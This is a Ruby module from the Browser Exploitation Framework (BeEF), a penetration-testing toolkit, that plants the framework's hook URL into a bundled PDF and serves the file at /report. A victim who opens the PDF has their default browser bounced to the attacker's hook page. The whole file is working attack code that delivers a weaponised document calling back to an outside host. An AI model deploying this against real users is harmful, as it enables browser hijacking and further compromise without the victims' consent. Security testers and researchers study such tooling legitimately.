#
# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#

class Hook_default_browser < BeEF::Core::Command

  def self.options
    configuration = BeEF::Core::Configuration.instance
    hook_uri = "http://#{configuration.get("beef.http.host")}:#{configuration.get("beef.http.port")}/demos/report.html"
    return [
        #{'name' => 'url', 'ui_label'=>'URL', 'type' => 'text', 'width' => '400px', 'value' => hook_uri },
    ]
  end 

  def pre_send

    #Get the servers configurations.
    configuration = BeEF::Core::Configuration.instance
		
		#The hook url to be replace the token in the original pdf file.
		hook_uri = "http://#{configuration.get("beef.http.host")}:#{configuration.get("beef.http.port")}/demos/report.html"
		
		# A new pdf file containg the actual hook URI instead of the dummy token.
		configured_hook_file = File.open("./modules/host/hook_default_browser/bounce_to_ie_configured.pdf","w")
		
		# The original pdf file contains a token that will get replaced during the initialization with
		# the actual hook URI of beef. Note that the hook URI is accessed via the DNS name.		
		File.open('./modules/host/hook_default_browser/bounce_to_ie.pdf',"r") { |original_hook_file|
			original_hook_file.each_line { |line|				
				# If the line includes the hook token, then replace it with the actual hook URI
				if(line.include? '<hookURI>')
					line = line.sub(/<hookURI>/, hook_uri)
				end
				#write the line to a new file
				configured_hook_file.write(line)
			}
		}
		
		configured_hook_file.close()
		
		
		#Bind the configured PDF file to the web server.
		BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/host/hook_default_browser/bounce_to_ie_configured.pdf', '/report', 'pdf', -1); 
    
  end

  def post_execute
    content = {}
    content['result'] = @datastore['result']          
    
    save content
    #update_zombie!
  end
  
end
